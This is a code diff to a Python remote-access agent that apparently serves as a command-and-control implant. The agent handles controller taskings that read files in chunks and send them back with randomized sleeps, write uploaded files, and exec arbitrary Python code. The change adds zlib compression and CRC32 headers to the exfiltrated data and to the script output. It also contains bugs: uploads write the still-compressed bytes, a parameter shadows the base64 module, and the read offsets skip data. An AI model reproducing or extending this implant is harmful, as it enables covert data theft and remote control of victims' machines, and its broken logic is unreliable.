@@ -6,6 +6,7 @@ import os
 import sys
 import trace
 import shlex
+import zlib
 import threading
 import BaseHTTPServer
 
@@ -248,17 +249,20 @@ def processPacket(taskingID, data):
 
         offset = 0
         size = os.path.getsize(filePath)
+        partIndex = 0
 
         while True:
 
-            partIndex = 0
-
             # get 512kb of the given file starting at the specified offset
-            encodedPart = get_file_part(filePath, offset)
+            encodedPart = get_file_part(filePath, offset=offset, base64=False)
+            c = compress()
+            start_crc32 = c.crc32_data(encodedPart)
+            comp_data = c.comp_data(encodedPart)
+            encodedPart = c.build_header(comp_data, start_crc32)
+            encodedPart = base64.b64encode(encodedPart)
 
             partData = "%s|%s|%s" %(partIndex, filePath, encodedPart)
-
-            if not encodedPart or encodedPart == '':
+            if not encodedPart or encodedPart == '' or len(encodedPart) == 16:
                 break
 
             sendMessage(encodePacket(41, partData))
@@ -272,26 +276,28 @@ def processPacket(taskingID, data):
             maxSleep = int((1.0+jitter)*delay)
             sleepTime = random.randint(minSleep, maxSleep)
             time.sleep(sleepTime)
-
             partIndex += 1
             offset += 5120000
 
     elif taskingID == 42:
         # file upload
-
-        parts = data.split("|")
-        filePath = parts[0]
-        base64part = parts[1]
-
-        raw = base64.b64decode(base64part)
-        f = open(filePath, 'ab')
-        f.write(raw)
-        f.close()
-
         try:
+            parts = data.split("|")
+            filePath = parts[0]
+            base64part = parts[1]
+            raw = base64.b64decode(base64part)
+            d = decompress()
+            dec_data = d.dec_data(raw, cheader=True)
+            if not dec_data['crc32_check']:
+                sendMessage(encodePacket(0, "[!] WARNING: File upload failed crc32 check during decompressing!."))
+                sendMessage(encodePacket(0, "[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!." %(dec_data['header_crc32'],dec_data['dec_crc32'],dec_data['crc32_check'])))
+            f = open(filePath, 'ab')
+            f.write(raw)
+            f.close()
+
             sendMessage(encodePacket(42, "[*] Upload of %s successful" %(filePath) ))
-        except:
-            sendMessage(encodePacket(0, "[!] Error in writing file %s during upload" %(filePath) ))
+        except Exception as e:
+            sendMessage(encodePacket(0, "[!] Error in writing file %s during upload: %s" %(filePath, str(e)) ))
 
     elif taskingID == 50:
         # return the currently running jobs
@@ -338,14 +344,18 @@ def processPacket(taskingID, data):
         prefix = data[0:15].strip()
         extension = data[15:20].strip()
         data = data[20:]
-
         try:
             buffer = StringIO()
             sys.stdout = buffer
             code_obj = compile(data, '<string>', 'exec')
             exec code_obj in globals()
             sys.stdout = sys.__stdout__
-            return encodePacket(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + str(buffer.getvalue()) )
+            c = compress()
+            start_crc32 = c.crc32_data(buffer.getvalue())
+            comp_data = c.comp_data(buffer.getvalue())
+            encodedPart = c.build_header(comp_data, start_crc32)
+            encodedPart = base64.b64encode(encodedPart)
+            return encodePacket(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + encodedPart )
         except Exception as e:
             # Also return partial code that has been executed
             errorData = str(buffer.getvalue())
@@ -398,6 +408,92 @@ def processPacket(taskingID, data):
 # misc methods
 #
 ################################################
+class compress(object):
+    
+    '''
+    Base clase for init of the package. This will handle
+    the initial object creation for conducting basic functions.
+    '''
+
+    CRC_HSIZE = 4
+    COMP_RATIO = 9
+
+    def __init__(self, verbose=False):
+        """
+        Populates init.
+        """
+        pass
+
+    def comp_data(self, data, cvalue=COMP_RATIO):
+        '''
+        Takes in a string and computes
+        the comp obj.
+        data = string wanting compression
+        cvalue = 0-9 comp value (default 6)
+        '''
+        cdata = zlib.compress(data,cvalue)
+        return cdata
+
+    def crc32_data(self, data):
+        '''
+        Takes in a string and computes crc32 value.
+        data = string before compression
+        returns:
+        HEX bytes of data
+        '''
+        crc = zlib.crc32(data) & 0xFFFFFFFF
+        return crc
+
+    def build_header(self, data, crc):
+        '''
+        Takes comp data, org crc32 value,
+        and adds self header.
+        data =  comp data
+        crc = crc32 value
+        '''
+        header = struct.pack("!I",crc)
+        built_data = header + data
+        return built_data
+
+class decompress(object):
+    
+    '''
+    Base clase for init of the package. This will handle
+    the initial object creation for conducting basic functions.
+    '''
+
+    CRC_HSIZE = 4
+    COMP_RATIO = 9
+
+    def __init__(self, verbose=False):
+        """
+        Populates init.
+        """
+        pass
+
+    def dec_data(self, data, cheader=True):
+        '''
+        Takes:
+        Custom / standard header data
+        data = comp data with zlib header
+        BOOL cheader = passing custom crc32 header
+        returns:
+        dict with crc32 cheack and dec data string
+        ex. {"crc32" : true, "dec_data" : "-SNIP-"}
+        '''
+        if cheader:
+            comp_crc32 = struct.unpack("!I", data[:self.CRC_HSIZE])[0]
+            dec_data = zlib.decompress(data[self.CRC_HSIZE:])
+            dec_crc32 = zlib.crc32(dec_data) & 0xFFFFFFFF
+            if comp_crc32 == dec_crc32:
+                crc32 = True
+            else:
+                crc32 = False
+            return { "header_crc32" : comp_crc32, "dec_crc32" : dec_crc32, "crc32_check" : crc32, "data" : dec_data }
+        else:
+            dec_data = zlib.decompress(data)
+            return dec_data
+
 def agent_exit():
     # exit for proper job / thread cleanup
     if len(jobs) > 0:
@@ -593,17 +689,19 @@ def run_command(command):
         return str(output)
 
 
-def get_file_part(filePath, offset=0, chunkSize=512000):
+def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
 
     if not os.path.exists(filePath):
         return ''
 
     f = open(filePath, 'rb')
-    f.seek(offset, 1)
+    f.seek(offset, 0)
     data = f.read(chunkSize)
     f.close()
-
-    return base64.b64encode(data)
+    if base64: 
+        return base64.b64encode(data)
+    else:
+        return data
 
 ################################################
 #
